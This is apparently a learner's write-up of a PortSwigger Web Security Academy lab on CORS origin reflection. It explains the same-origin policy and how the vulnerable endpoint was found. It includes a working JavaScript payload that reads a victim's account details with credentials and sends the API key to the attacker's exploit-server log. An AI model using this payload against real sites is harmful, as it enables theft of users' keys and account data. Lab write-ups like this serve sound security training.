# CORS

## **What is CORS (cross-origin resource sharing)?**

Cross-origin resource sharing (CORS) is a browser mechanism which 
enables controlled access to resources located outside of a given 
domain. It extends and adds flexibility to the same-origin policy ([SOP](https://portswigger.net/web-security/cors/same-origin-policy)
).
 However, it also provides potential for cross-domain attacks, if a 
website's CORS policy is poorly configured and implemented. CORS is not a
 protection against cross-origin attacks such as [cross-site request forgery](https://portswigger.net/web-security/csrf)
 (CSRF).

## **[Lab: CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)**

### Description

> 
> 
> 
> This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all origins.
> 
> To solve the lab, craft some JavaScript that uses CORS to 
> retrieve the administrator's API key and upload the code to your exploit
>  server. The lab is solved when you successfully submit the 
> administrator's API key.
> 
> You can log in to your own account using the following credentials: `wiener:peter`
> 

### Solution:

***Same-Origin Policy – SOP:** In short, SOP is a form of restrictive cross-origin specification (I roughly translate as cross-origin control feature) to limit the ability of websites to interact with resources outside the source domain. The goal of SOP is to prevent malicious interactions between domains (for example, a website that tries to steal sensitive data from another website).*

After turning on Burp Suite to capture traffic and turning off Proxy Interception, I logged into the application with the familiar credentials `wiener:peter`.

Here I notice the presence of an API Key in the My Account.

![Untitled](CORS%200cd642a5a74f4c0aa3cc08ca99b57bc8/Untitled.png)

Checking the Proxy History I noticed that the API Key is retrieved through the `Asynchronous Javascript and XML – AJAX` (roughly an asynchronous processing method that does not need to be sequenced) the request to `/accountDetails.` The response also contains an `Access-Control-Allow-Credentials` header indicating that the application can support CORS.

![Untitled](CORS%200cd642a5a74f4c0aa3cc08ca99b57bc8/Untitled%201.png)

I try sticking the header `Origin: https://test.com` into the request and send.

At this point in the response, I noticed that the Origin header I clicked on appeared in the `Access-Control-Allow-Origin header`.

![Untitled](CORS%200cd642a5a74f4c0aa3cc08ca99b57bc8/Untitled%202.png)

I can write a script like the following and put it in the body of the exploit server to read the **API key**.

```jsx
<script>

    var req = new XMLHttpRequest();

    req.onload = reqListener;

    req.open('get','$url/accountDetails',true);

    req.withCredentials = true;

    req.send();

 

    function reqListener() {

        location='/log?key='+this.responseText;

    };

</script>
```

![Untitled](CORS%200cd642a5a74f4c0aa3cc08ca99b57bc8/Untitled%203.png)

After Store and View exploit I will see the API key appear in the URL in the log page., I can click Deliver exploit to victim and access the Access log to get the victim's API key.